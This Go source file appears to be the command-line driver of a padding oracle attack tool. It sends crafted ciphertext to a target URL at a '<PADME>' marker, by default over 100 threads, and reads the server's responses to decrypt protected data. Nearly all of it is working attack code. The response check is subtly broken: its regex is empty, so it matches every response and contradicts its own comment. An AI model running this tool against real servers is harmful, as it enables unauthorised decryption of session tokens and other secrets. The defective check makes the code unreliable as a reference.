package main

import (
	"flag"
	"fmt"
	"net/http"
	_ "net/http/pprof"

	"encoding/hex"
	"io/ioutil"
	"regexp"
	"strings"

	"log"

	"github.com/swarley7/padoracle/libpadoracle"
)

type testpad struct {
	Data   string
	URL    string
	Method string
}

var client = &http.Client{}

// EncodePayload turns the raw oracle payload (IV + Ciphertext) into whatever format is required by the endpoint server. Modify this routine to suit the specific needs of the application.
func (t testpad) EncodePayload(RawPadOraclePayload []byte) (encodedPayload string) {
	encodedPayload = hex.EncodeToString(RawPadOraclePayload)
	return encodedPayload
}

// DecodePayload is used to decode the initial CipherText payload provided as a CommandLine Argument
func (t testpad) DecodeCiphertextPayload(EncodedPayload string) []byte {
	var decoded []byte
	//****** EDIT this function to suit your particular ciphertext's encoding. ********//
	// This function should return a byte array of the ciphertext's raw bytes //
	decoded, err := hex.DecodeString(EncodedPayload)
	libpadoracle.Check(err)
	return decoded
}

// DecodeIV decodes the optionally-supplied Block0 initialisation vector. Modify the decode routine to suit the format of the supplied IV
func (t testpad) DecodeIV(IV string) []byte {
	return t.DecodeCiphertextPayload(IV)
}

// CallOracle actually makes the HTTP/whatever request to the server that provides the padding oracle. Modify this to suit your application's needs.
// Note the map[string][]byte gives you the opportunity to use whatever data from the response is available
func (t testpad) CallOracle(encodedPayload string) map[string][]byte {
	// Sample to be used with padex.py

	if !strings.Contains(t.URL, "<PADME>") && !strings.Contains(t.Data, "<PADME>") {
		panic("No marker supplied in URL or data")
	}
	req, err := http.NewRequest(t.Method, strings.Replace(t.URL, "<PADME>", encodedPayload, -1), strings.NewReader(strings.Replace(t.Data, "<PADME>", encodedPayload, -1)))
	libpadoracle.Check(err)
	resp, err := client.Do(req)
	libpadoracle.Check(err)
	defer resp.Body.Close() // Return the response data back to the caller

	bodyBytes, err := ioutil.ReadAll(resp.Body)
	libpadoracle.Check(err)
	retdata := map[string][]byte{"body": bodyBytes, "resp_code": []byte{byte(resp.StatusCode)}}
	return retdata
}

// libpadoracle.CheckResponse tells the program whether the padding was invalid or not. Modify to suit the application's response when invalid padding is detected.
func (t testpad) CheckResponse(resp map[string][]byte) bool {
	// Sample - the server's response includes the string "Invalid Padding"
	matched, err := regexp.MatchString(``, string(resp["body"]))
	fmt.Println(matched, err)
	if matched {
		return false
	}
	return true
}

func main() {
	var cfg libpadoracle.Config
	var cipherText string
	var iv string
	var url string
	var method string
	var data string
	flag.StringVar(&cipherText, "c", "", "Provide the base ciphertext that you're trying to decipher (ripped straight from your request)")
	flag.StringVar(&iv, "iv", "", "Optional: provide the IV for Block 0 of your ciphertext (if the application has done Crypto bad, and treated the IV as secret)")
	flag.IntVar(&cfg.BlockSize, "bs", 16, "Block size for the ciphertext. Common values are 8 (DES), 16 (AES)")
	flag.IntVar(&cfg.Threads, "T", 100, "Number of threads to use for testing")
	flag.IntVar(&cfg.Sleep, "S", 0, "Sleep x miliseconds between requests to be nice to the server")
	flag.StringVar(&cfg.BlockRange, "blocks", "1,-1", "Optional: provide a range of blocks that are to be decrypted (useful for testing purposes). Note that the first value should always be '>=1'")
	flag.StringVar(&url, "u", "", "The target URL. Use the marker '<PADME>' to identify the injection point (note: will libpadoracle.Check GET and POST data)")
	flag.StringVar(&method, "m", "GET", "HTTP method to use (default GET)")
	flag.StringVar(&data, "data", "", "Optional: POST data to supply with request")

	flag.BoolVar(&cfg.Debug, "d", false, "Debug mode")

	flag.Parse()
	if url == "" {
		log.Fatal("No URL supplied.")
	}
	if cfg.Debug {
		go func() {
			fmt.Println("Profiler running on: localhost:6060")
			http.ListenAndServe("localhost:6060", nil)
		}()
	}
	cfg.Pad = testpad{URL: url, Method: method, Data: data}

	cfg.BaseCiphertext = cfg.Pad.DecodeCiphertextPayload(cipherText)
	if iv != "" {
		cfg.IV = cfg.Pad.DecodeIV(iv)
	}
	libpadoracle.Run(cfg)

}
